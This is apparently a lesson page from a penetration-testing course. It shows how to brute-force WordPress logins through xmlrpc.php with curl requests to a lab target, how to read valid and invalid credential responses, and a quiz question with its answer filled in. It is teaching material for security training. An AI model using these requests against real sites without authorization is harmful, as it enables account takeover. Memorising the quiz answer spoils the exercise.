
<h1>Login</h1>
<hr/>
<p>Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the <code>xmlrpc.php</code> page.</p>
<p>If our POST request against <code>xmlrpc.php</code> contains valid credentials, we will receive the following output:</p>
<h4>cURL - POST Request</h4>
<pre><code class="language-shell-session">[!bash!]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;array&gt;&lt;data&gt;
  &lt;value&gt;&lt;struct&gt;
  &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;url&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;blogid&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Inlanefreight&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;xmlrpc&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/xmlrpc.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;
&lt;/data&gt;&lt;/array&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;
</code></pre>
<p>If the credentials are not valid, we will receive a <code>403 faultCode</code> error.</p>
<h4>Invalid Credentials - 403 Forbidden</h4>
<pre><code class="language-shell-session">[!bash!]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;asdasd&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;
</code></pre>
<p>These last few sections introduced several methods for performing manual enumeration against a WordPress instance. It is essential to understand manual methods before attempting to use automated tools. While automated tools greatly speed up the penetration testing process, it is our responsibility to understand their impact on the systems we are assessing. A solid understanding of manual enumeration methods will also assist with troubleshooting should any automated tools not function properly or provide unexpected output.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="5"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Search for "WordPress xmlrpc attacks" and find out how to use it to execute all method calls. Enter the number of possible method calls of your target as the answer.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control text-success" disabled="true" type="text" value="80"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="5" disabled="true" id="btnAnswer5">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint5" data-toggle="modal" id="hintBtn5"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
